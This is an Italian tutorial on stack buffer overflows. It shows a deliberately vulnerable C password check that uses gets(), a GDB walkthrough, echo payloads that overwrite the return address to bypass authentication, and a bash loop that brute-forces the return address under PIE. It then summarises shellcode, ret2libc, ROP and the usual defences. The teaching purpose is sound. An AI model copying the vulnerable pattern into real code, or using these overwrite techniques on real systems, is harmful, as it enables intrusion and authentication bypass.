# Stack overflow

Un buffer overflow che si verifica nello stack, si chiama **stack overflow**.

Subito dopo le variabili locali, nello stack sono presenti il **vecchio stack pointer** e l’**indirizzo di ritorno**. Uno stack overflow può sovrascriverli per modificare il flusso di codice ed eseguire codice arbitrario.

![https://i.ibb.co/sPGp08Y/image.png](https://i.ibb.co/sPGp08Y/image.png)

1. la `mov` mette in `rax` il valore di ritorno `b`
2. la `leave` sposta lo *stack pointer* sul `return address` e sposta il *base pointer* all’indirizzo `old rbp`
3. la `ret` imposta l’*instruction pointer* all’indirizzo `return address` (cioè all’istruzione successiva rispetto al momento della chiamata della funzione `func`)

L’idea per sfruttare lo stack overflow è quella di andare a **modificare il *return address*** con un altro che porta a del codice arbitrario.

## Esempio

Considerando il seguente codice:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int checkpassword() {
		char s[16];
		
		printf("Insert password: ");
		
		// reads password, no check on length!
		gets(s);
		
		if (strcmp(s, "sEgr3t0") == 0)
				return 1;
		else
				return 0;
}

int main(int argc, char *argv[]) {
		if (checkpassword()) {
				printf("Authenticated!\n");
				exit(EXIT_SUCCESS);
		}
		else {
				printf("Wrong password!\n");
				exit(EXIT_FAILURE);
		}
}
```

Supponiamo che la password non possa essere sovrascritta e non possa essere ottenuta dal file binario.

### Caso 1

Se compiliamo disabilitando dei sistemi di sicurezza, ad esempio **PIE e lo stack protector**

`gcc stack-pwd.c -o stack-pwd -fno-stack-protector --no-pie --static`

Analizziamo il programma con GDB:

```bash
gdb stack-pwd -q
```

impostando un breakpoint sulla funzione `checkpassword` e poi facendo `nexti` per eseguire l’istruzione che alloca il buffer `s`.

lanciando il comando i seguenti comandi visualizziamo lo stato dello stack:

```bash
(gdb) break checkpassword
(gdb) run
(gdb) nexti
(gdb) info registers
...
rbp            0x7fffffffe570
rsp            0x7fffffffe560
...
```

possiamo ispezionare lo stack

```bash
(gdb) x/4gx $rsp
0x7fffffffe560: 0x00007fffffffe6b8      0x0000000000400400
0x7fffffffe570: 0x00007fffffffe590      0x0000000000400bc0
#indirizzo:      primi 8 byte            secondi 8 byte
```

la prima riga è l’indirizzo dove punta lo *stack pointer* e all’interno c’è solo dati sporcizia, sono lo spazio allocato per il buffer di 16 byte.

la seconda riga è dove punta il *base pointer* e nei primi 8 byte contiene l’indirizzo al vecchio *base pointer*, mentre nei successivi 8 byte contiene l’indirizzo di ritorno.

L’obiettivo è quello di riempire il buffer, per poi sovrascrivere gli 8 byte contenenti l’indirizzo del vecchio base pointer e poi sovrascrivere l’indirizzo di ritorno con un nuovo indirizzo che punta dove vogliamo.

Troviamo l’indirizzo di ritorno che vogliamo sovrascrivere:
facendo il disassembly del main

```bash
(gdb) disass main
Dump of assembler code for function main:
   0x0000000000400ba7 <+0>:     push   rbp
   0x0000000000400ba8 <+1>:     mov    rbp,rsp
   0x0000000000400bab <+4>:     sub    rsp,0x10
   0x0000000000400baf <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x0000000000400bb2 <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400bb6 <+15>:    mov    eax,0x0
   0x0000000000400bbb <+20>:    call   0x400b4d <checkpassword>   # invoca checkpassword
   0x0000000000400bc0 <+25>:    test   eax,eax
   0x0000000000400bc2 <+27>:    je     0x400bd8 <main+49>
   0x0000000000400bc4 <+29>:    mov    edi,0x49241e
   0x0000000000400bc9 <+34>:    call   0x410500 <puts>     #stampa in output
   0x0000000000400bce <+39>:    mov    edi,0x0
   0x0000000000400bd3 <+44>:    call   0x40eab0 <exit>
   0x0000000000400bd8 <+49>:    mov    edi,0x49242d
   0x0000000000400bdd <+54>:    call   0x410500 <puts>     #stampa in output
   0x0000000000400be2 <+59>:    mov    edi,0x1
   0x0000000000400be7 <+64>:    call   0x40eab0 <exit>
```

Andando ad ispezionare i parametri passati alla funzione `puts` possiamo capire dove vogliamo ritornare infatti:

```bash
(gdb) x/s 0x49241e
0x49241e:       "Authenticated!"
```

vogliamo quindi saltare all’istruzione con indirizzo `0x0000000000400bc4 <+29>`

Eseguendo il programma con questo input funziona:

```bash
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\xc4\x0b\x40\x00\x00\x00\x00\x00" | ./stack-pwd
Insert password: Authenticated!
```

Vengono usate 24 ‘A’ per sovrascrivere i 16 byte del buffer e gli 8 byte per il vecchio base pointer, i rimanente 8 byte vengono sovrascritti con il nuovo indirizzo (in *little endian*)

### Caso 2

Se compiliamo disabilitando solo lo **stack protector.**

`gcc stack-pwd.c -o stack-pwd-pie -fno-stack-protector`

In questo caso gli indirizzi vengono randomizzati ad ogni esecuzione, tranne gli ultimi 3 caratteri esadecimali (quindi un byte e mezzo, 12 bit) che sono un offset fisso.

Se facciamo un disassemly del main otteniamo:

```bash
(gdb) disass main 
 0x000000000000085c <+20>:    call   0x7ea <checkpassword>
 0x0000000000000861 <+25>:    test   eax,eax               #ritorno previsto
 0x0000000000000863 <+27>:    je     0x87b <main+51>
 0x0000000000000865 <+29>:    lea    rdi,[rip+0xd2]        #ritorno che vogliamo
 0x000000000000086c <+36>:    call   0x670 <puts@plt>
```

Abbiamo quindi i primi 13 caratteri randomizzati mentre gli ultimi 3 sono fissi.

Per riuscire nell’attacco dovremmo quindi sovrascrivere gli ultimi due byte con l’offset che interessa a noi, ad esempio `0x65 0x08` e ripetere l’attacco fino a che randomicamente l’indirizzo non termina con `00 08 65`

Dove `00` è il carattere di fine stringa sul nostro input, `08` è il un byte che abbiamo sovrascritto (di cui solo `8` fa parte dell’offset) e `65` è l’altro byte che abbiamo sovrascritto che fa parte interamente dell’offset.

Dato che `865` è l’offset fisso devo ripetere l’attacco finché davanti all’offset non appare in modo randomico `000`.

uno script bash per tentare è il seguente:

```bash
i=1; while true; do echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x65\x08" | ./stack-pwd-pie  | grep Auth; echo $i; i=$((i+1)); done | grep -B 1 Auth
```

## Altre tecniche di attacco

- Un **shellcode** è un pezzo di codice macchina (solitamente in linguaggio assembly) che un attaccante inserisce nello stack. Una volta che lo stack viene sovrascritto, l'attaccante modifica il puntatore di ritorno  per eseguire il proprio shellcode. In genere, questo codice apre una "shell" che consente il controllo remoto della macchina compromessa.
- **Return to syscall / libc**: In questa tecnica, piuttosto che iniettare il codice direttamente (come uno shellcode), l'attaccante sfrutta funzioni di sistema esistenti, come quelle della *libc* (la libreria C standard), che sono già caricate in memoria. Ad esempio, l'attaccante può sovrascrivere lo stack in modo che l'esecuzione del programma "ritorni" a una funzione di sistema critica, come `system()`, che esegue comandi.
- Il **Return Oriented Programming (ROP)** permette di concatenare una serie di istruzioni assembly (chiamate gadget) già presenti nel binario stesso o nelle librerie di sistema (come *libc*) al fine di eseguire del codice a piacere. L'idea è simile all’attacco precedente, ma con ROP si possono combinare vari gadget per creare un comportamento complesso senza la necessità di iniettare nuovo codice.

## Difese

Si possono adottare delle difese contro lo stack overflow, in particolare difese a tempo di compilazione e a run-time.

### Difese a tempo di compilazione

Il metodo è quello di scrivere programmi più resistenti a questo tipo di attacco:

- **Utilizzo di linguaggi sicuri**: è consigliato utilizzare linguaggi di programmazione sicuri che gestiscono automaticamente le dimensioni dei buffer e le eccezioni, limitando l'uso di linguaggi non sicuri solo quando strettamente necessario (es. per l'accesso diretto all'hardware o per performance estreme).
- **Tecniche di codifica sicura**: verificare sempre i limiti dei buffer e utilizzare funzioni di libreria sicure.
- **Protezione dello stack**: il compilatore può aggiungere codice aggiuntivo per monitorare la corruzione dello stack. Una tecnica comune è l'uso di un **canary**, un valore casuale inserito dopo il vecchio base pointer di un frame.
    - **Canary**: quando una funzione inizia, un valore casuale (canary) viene copiato nello allo stack. Prima che la funzione ritorni, il canary viene confrontato con il valore originale e, se non corrisponde, il programma abortisce. Questa tecnica è molto efficace nel prevenire overflow dello stack, ma è vulnerabile se il valore del canary viene trapelato o se un attaccante può accedere direttamente allo stack.

### Difese a run-time

- **Non-eXecutable address space (NX)**: questa difesa impedisce l'esecuzione di codice in segmenti di memoria specifici (come stack o heap), richiedendo il supporto hardware. Blocca l'esecuzione di **shellcode**, ma non impedisce attacchi come **return to syscall**, **libc** o **ROP**. Alcuni programmi disabilitano NX se necessitano di eseguire codice sullo stack.
- **Address Space Layout Randomization (ASLR)**: l'ASLR randomizza la disposizione della memoria del programma, rendendo più difficile per un attaccante conoscere gli indirizzi esatti a cui fare return dopo uno stack overflow. Tuttavia, può essere aggirata con tecniche di brute-force o se gli indirizzi di memoria vengono rivelati
